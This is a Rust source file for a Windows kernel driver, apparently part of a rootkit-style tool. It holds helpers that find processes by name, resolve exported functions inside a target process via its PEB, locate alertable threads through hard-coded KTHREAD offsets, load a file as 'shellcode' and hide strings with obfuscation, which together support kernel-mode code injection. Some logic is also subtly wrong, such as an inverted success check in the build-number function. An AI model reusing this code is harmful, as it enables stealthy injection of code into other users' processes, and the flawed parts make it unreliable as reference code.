use {
    ntapi::{
        ntldr::LDR_DATA_TABLE_ENTRY, 
        ntpebteb::PEB, 
        ntzwapi::ZwQuerySystemInformation,
        ntexapi::{
            SystemModuleInformation, 
            SystemProcessInformation, 
            PSYSTEM_PROCESS_INFORMATION
        }, 
    }, 
    wdk_sys::{
        *, ntddk::*, 
        _FILE_INFORMATION_CLASS::FileStandardInformation,
    }, 
    winapi::um::winnt::{
        IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
        IMAGE_NT_HEADERS64
    } 
};

use {
    obfstr::obfstr, 
    handles::Handle,
    pool::PoolMemory, 
    process_attach::ProcessAttach,
    alloc::{string::String, vec::Vec},
    core::{
        ffi::{c_void, CStr}, 
        mem::{size_of, zeroed}, 
        ptr::{null_mut, read_unaligned}, 
        slice::from_raw_parts
    },
    crate::{
        process::Process,
        internals::{
            structs::SystemModuleInformation, 
            externs::PsGetProcessPeb
        }, 
    }, 
};

#[cfg(not(test))]
extern crate wdk_panic;

#[cfg(not(test))]
use wdk_alloc::WDKAllocator;

#[cfg(not(test))]
#[global_allocator]
static GLOBAL_ALLOCATOR: WDKAllocator = WDKAllocator;

pub mod macros;
pub mod offsets;
pub mod uni;
pub mod ioctls;
pub mod patterns;
pub mod address;
pub mod handles;
pub mod pool;
pub mod process_attach;

/// Retrieves the input buffer from the given IO stack location.
///
/// # Arguments
/// 
/// - `stack`: A pointer to the `_IO_STACK_LOCATION` structure.
///
/// # Returns
/// 
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the input buffer or an NTSTATUS error code.
///
pub unsafe fn get_input_buffer<T>(stack: *mut _IO_STACK_LOCATION) -> Result<*mut T, NTSTATUS> {
    let input_buffer = (*stack).Parameters.DeviceIoControl.Type3InputBuffer;
    if input_buffer.is_null() {
        log::error!("Type3InputBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(input_buffer as *mut T)
    }
}

/// Retrieves the output buffer from the given IRP.
///
/// # Arguments
/// 
/// - `irp`: A pointer to the `IRP` structure.
///
/// # Returns
/// 
/// - `Result<*mut T, NTSTATUS>`: A result containing the pointer to the output buffer or an NTSTATUS error code.
///
pub unsafe fn get_output_buffer<T>(irp: *mut IRP) -> Result<*mut T, NTSTATUS> {
    let output_buffer = (*irp).UserBuffer;
    if output_buffer.is_null() {
        log::error!("UserBuffer is null");
        Err(STATUS_INVALID_PARAMETER)
    } else {
        Ok(output_buffer as *mut T)
    }
}

/// Retrieves the PID of a process by its name.
///
/// # Arguments
/// 
/// - `process_name`: A string slice containing the name of the process.
///
/// # Returns
/// 
/// - `Option<usize>`: An optional containing the PID of the process, or None if the process is not found.
///
pub unsafe fn get_process_by_name(process_name: &str) -> Option<usize> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let info_process = PoolMemory::new(POOL_FLAG_NON_PAGED, return_bytes as u64, u32::from_be_bytes(*b"diws"))
        .map(|mem| mem.ptr as PSYSTEM_PROCESS_INFORMATION)
        .or_else(|| {
            log::error!("PoolMemory (Process By Name) Failed");
            None
        })?;

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        info_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = info_process;

    loop {
        if !(*process_info).ImageName.Buffer.is_null() {
            let image_name = from_raw_parts((*process_info).ImageName.Buffer, ((*process_info).ImageName.Length / 2) as usize);
            let name = String::from_utf16_lossy(image_name);
            if name == process_name {
                let pid = (*process_info).UniqueProcessId as usize;
                return Some(pid);
            }
        }

        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    None
}

/// Retrieves the address of a specified function within a module in the context of a target process.
///
/// # Arguments
/// 
/// - `pid`: The process ID (PID) of the target process.
/// - `module_name`: The name of the module (DLL) to be searched for. The search is case-insensitive.
/// - `function_name`: The name of the function within the module to be found.
/// 
/// # Returns
/// 
/// - `Option<*mut c_void>`: The address of the target function if found.
/// 
pub unsafe fn get_module_peb(pid: usize, module_name: &str, function_name: &str) -> Option<*mut c_void> {
    let apc_state: KAPC_STATE = core::mem::zeroed();
    let target = Process::new(pid)?;

    let attach_process = ProcessAttach::new(target.e_process);
    let target_peb = PsGetProcessPeb(target.e_process) as *mut PEB;
    if target_peb.is_null() || (*target_peb).Ldr.is_null() {
        return None;
    }
    
    let current = &mut (*(*target_peb).Ldr).InLoadOrderModuleList as *mut winapi::shared::ntdef::LIST_ENTRY;
    let mut next = (*(*target_peb).Ldr).InLoadOrderModuleList.Flink;      

    while next != current {
        if next.is_null() {
            log::error!("Next LIST_ENTRY is null");
            return None;
        }

        let list_entry = next as *mut LDR_DATA_TABLE_ENTRY;
        if list_entry.is_null() {
            log::error!("LDR_DATA_TABLE_ENTRY is null");
            return None;
        }

        let buffer = core::slice::from_raw_parts(
            (*list_entry).FullDllName.Buffer,
            ((*list_entry).FullDllName.Length / 2) as usize,
        );
        if buffer.is_empty() {
            log::error!("Buffer for module name is empty");
            return None;
        }

        let dll_name = alloc::string::String::from_utf16_lossy(buffer);
        if dll_name.to_lowercase().contains(module_name) {
            let dll_base = (*list_entry).DllBase as usize;
            let dos_header = dll_base as *mut IMAGE_DOS_HEADER;
            let nt_header = (dll_base + (*dos_header).e_lfanew as usize) as *mut IMAGE_NT_HEADERS64;
        
            let export_directory = (dll_base + (*nt_header).OptionalHeader.DataDirectory[0].VirtualAddress as usize) as *mut IMAGE_EXPORT_DIRECTORY;
            let names = from_raw_parts((dll_base + (*export_directory).AddressOfNames as usize) as *const u32,(*export_directory).NumberOfNames as _);
            let functions = from_raw_parts((dll_base + (*export_directory).AddressOfFunctions as usize) as *const u32,(*export_directory).NumberOfFunctions as _);
            let ordinals = from_raw_parts((dll_base + (*export_directory).AddressOfNameOrdinals as usize) as *const u16, (*export_directory).NumberOfNames as _);
        
            for i in 0..(*export_directory).NumberOfNames as isize {
                let name_module = CStr::from_ptr((dll_base + names[i as usize] as usize) as *const i8).to_str().ok()?;
                let ordinal = ordinals[i as usize] as usize;
                let address = (dll_base + functions[ordinal] as usize) as *mut c_void;
                if name_module == function_name {
                    return Some(address);
                }
            }
        }

        next = (*next).Flink;
    }

    None
}

/// Find for a thread with an alertable status.
/// 
/// # Arguments
/// 
/// - `target_pid`: PID that will fetch the tids.
///
/// # Returns
/// 
/// - `Option<*mut _KTHREAD>`: The KTHREAD of the thread found, or `None` if an error occurs or the thread is not found.
/// 
pub unsafe fn find_thread_alertable(target_pid: usize) -> Option<*mut _KTHREAD> {
    let mut return_bytes = 0;
    ZwQuerySystemInformation(SystemProcessInformation, null_mut(), 0, &mut return_bytes);
    let info_process = PoolMemory::new(POOL_FLAG_NON_PAGED, return_bytes as u64, u32::from_be_bytes(*b"oied"))?.ptr as PSYSTEM_PROCESS_INFORMATION; 
    if info_process.is_null() {
        log::error!("PoolMemory Failed");
        return None;
    }

    let status = ZwQuerySystemInformation(
        SystemProcessInformation,
        info_process as *mut winapi::ctypes::c_void,
        return_bytes,
        &mut return_bytes,
    );
    if !NT_SUCCESS(status) {
        log::error!("ZwQuerySystemInformation Failed With Status: {status}");
        return None;
    }

    let mut process_info = info_process;
    while (*process_info).NextEntryOffset != 0 {
        let pid = (*process_info).UniqueProcessId as usize;
        if pid == target_pid {
            let threads_slice = from_raw_parts((*process_info).Threads.as_ptr(), (*process_info).NumberOfThreads as usize,);
            for &thread in threads_slice {
                let thread_id = thread.ClientId.UniqueThread as usize;
                let target_thread = if let Some(thread) = crate::thread::Thread::new(thread_id) { thread } else { continue };

                if PsIsThreadTerminating(target_thread.e_thread) == 1 {
                    continue;
                }

                let is_alertable = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x74) as *const u64) & 0x10;
                let is_gui_thread = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x78) as *const u64) & 0x80;
                let thread_kernel_stack = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x58) as *const u64);
                let thread_context_stack = read_unaligned(target_thread.e_thread.cast::<u8>().offset(0x268) as *const u64);

                if is_alertable == 0 && is_gui_thread != 0 && thread_kernel_stack == 0 && thread_context_stack == 0 {
                    continue;
                }

                log::info!("Thread Found: {thread_id}");
                return Some(target_thread.e_thread)
            }
        }
        
        if (*process_info).NextEntryOffset == 0 {
            break;
        }

        process_info = (process_info as *const u8).add((*process_info).NextEntryOffset as usize) as PSYSTEM_PROCESS_INFORMATION;
    }

    None
}

/// Initializes the OBJECT_ATTRIBUTES structure.
///
/// # Arguments
/// 
/// - `object_name`: The name of the object (optional).
/// - `attributes`: The attributes of the object.
/// - `root_directory`: The root directory (optional).
/// - `security_descriptor`: The security descriptor (optional).
/// - `security_quality_of_service`: The security quality of service (optional).
///
/// # Returns
/// 
/// - `OBJECT_ATTRIBUTES`: The initialized OBJECT_ATTRIBUTES structure
/// 
#[allow(non_snake_case)]
pub fn InitializeObjectAttributes(
    object_name: Option<*mut UNICODE_STRING>,
    attributes: u32,
    root_directory: Option<*mut c_void>,
    security_descriptor: Option<*mut c_void>,
    security_quality_of_service: Option<*mut c_void>
) -> OBJECT_ATTRIBUTES {
    OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: root_directory.unwrap_or(null_mut()),
        ObjectName: object_name.unwrap_or(null_mut()),
        Attributes: attributes,
        SecurityDescriptor: security_descriptor.unwrap_or(null_mut()),
        SecurityQualityOfService: security_quality_of_service.unwrap_or(null_mut())
    }
}

/// Reads the content of a file given its path.
///
/// # Arguments
/// 
/// - `path`: The path to the file.
///
/// # Returns
/// 
/// - `Result<Vec<u8>, NTSTATUS>`: The content of the file as a vector of bytes if successful, or an NTSTATUS error code if an error occurs.
/// 
pub fn read_file(path: &String) -> Result<Vec<u8>, NTSTATUS> {
    let path_nt = alloc::format!("\\??\\{}", path);
    let file_name = crate::utils::uni::str_to_unicode(&path_nt);
    let mut io_status_block: _IO_STATUS_BLOCK = unsafe { zeroed() };
    let mut obj_attr = InitializeObjectAttributes(
        Some(&mut file_name.to_unicode()), 
        OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 
        None, 
        None, 
        None
    );

    let mut h_file: HANDLE = null_mut();
    let mut status = unsafe { 
        ZwCreateFile(
            &mut h_file,
            GENERIC_READ,
            &mut obj_attr,
            &mut io_status_block,
            null_mut(),
            FILE_ATTRIBUTE_NORMAL,
            0,
            FILE_OPEN,
            FILE_SYNCHRONOUS_IO_NONALERT,
            null_mut(),
            0,
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwCreateFile Failed With Status: {status}");
        return Err(status);
    }

    let h_file = Handle::new(h_file);

    let mut file_info: FILE_STANDARD_INFORMATION = unsafe { zeroed() };
    status = unsafe { 
        ZwQueryInformationFile(
            h_file.get(), 
            &mut io_status_block, 
            &mut file_info as *mut _ as *mut c_void, 
            size_of::<FILE_STANDARD_INFORMATION>() as u32, 
            FileStandardInformation
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwQueryInformationFile Failed With Status: {status}");
        return Err(status);
    }

    let file_size = unsafe { file_info.EndOfFile.QuadPart as usize };
    let mut byte_offset: LARGE_INTEGER = unsafe { zeroed() };
    byte_offset.QuadPart = 0;
    let mut shellcode = alloc::vec![0u8; file_size];
    status = unsafe { 
        ZwReadFile(
            h_file.get(),
            null_mut(),
            None,
            null_mut(),
            &mut io_status_block,
            shellcode.as_mut_ptr() as *mut c_void,
            file_size as u32,
            &mut byte_offset,
            null_mut()
        )
    };
    if !NT_SUCCESS(status) {
        log::error!("ZwReadFile Failed With Status: {status}");
        return Err(status);
    }

    Ok(shellcode)
}

/// Responsible for returning information on the modules loaded.
///
/// # Returns
///
/// - `Option<(*mut LDR_DATA_TABLE_ENTRY, i32)> `: Returns a content containing LDR_DATA_TABLE_ENTRY and the return of how many loaded modules there are in PsLoadedModuleList.
/// 
pub fn return_module() -> Option<(*mut LDR_DATA_TABLE_ENTRY, i32)> {
    let ps_module = crate::uni::str_to_unicode(obfstr!("PsLoadedModuleList"));
    let func = unsafe { MmGetSystemRoutineAddress(&mut ps_module.to_unicode()) as *mut LDR_DATA_TABLE_ENTRY };

    if func.is_null() {
        log::error!("PsLoadedModuleList is null");
        return None;
    }

    let mut list_entry = unsafe { (*func).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };
    let mut module_count = 0;

    let start_entry = list_entry;
    while !list_entry.is_null() && list_entry != func {
        module_count += 1;
        list_entry = unsafe { (*list_entry).InLoadOrderLinks.Flink as *mut LDR_DATA_TABLE_ENTRY };
    }

    Some((start_entry, module_count))
}

/// Validates if the given address is within the kernel memory range.
///
/// # Arguments
///
/// - `addr`: A 64-bit unsigned integer representing the address to validate.
///
/// # Returns
/// 
/// - `bool`: True if the address is within the kernel memory range, False otherwise.
///
pub fn valid_kernel_memory(addr: u64) -> bool {
    addr > 0x8000000000000000 && addr < 0xFFFFFFFFFFFFFFFF
}

/// Validates if the given address is within the user memory range.
///
/// # Arguments
/// 
/// - `addr`: A 64-bit unsigned integer representing the address to validate.
///
/// # Returns
///
/// - `bool`: True if the address is within the user memory range, False otherwise.
/// 
pub fn valid_user_memory(addr: u64) -> bool {
    addr > 0 && addr < 0x7FFFFFFFFFFFFFFF
}

/// Generic function that performs the operation with the lock already acquired.
/// It will acquire the lock exclusively and guarantee its release after use.
///
/// # Arguments
/// 
/// - `push_lock` - Pointer to the lock to be acquired.
/// - `operation` - The operation to be performed while the lock is active.
///
pub fn with_push_lock_exclusive<T, F>(push_lock: *mut u64, operation: F) -> T
where
    F: FnOnce() -> T,
{
    unsafe {
        ExAcquirePushLockExclusiveEx(push_lock, 0); // Get the lock exclusively
    }

    let result = operation(); // Performs the operation while the lock is active

    unsafe {
        ExReleasePushLockExclusiveEx(push_lock, 0); // Releases the lock after the operation
    }

    result // Returns the result of the operation
}

/// Retrieves the Windows build number by calling `RtlGetVersion`.
///
/// # Return
///
/// - `u32`: The Windows build number if successful, otherwise returns 0.
///
pub fn get_windows_build_number() -> u32 {
    unsafe {
        let mut os_info: OSVERSIONINFOW = core::mem::zeroed();
        os_info.dwOSVersionInfoSize = core::mem::size_of::<OSVERSIONINFOW>() as u32;

        if RtlGetVersion(&mut os_info) != 0 {
            return os_info.dwBuildNumber;
        }
    }
    0
}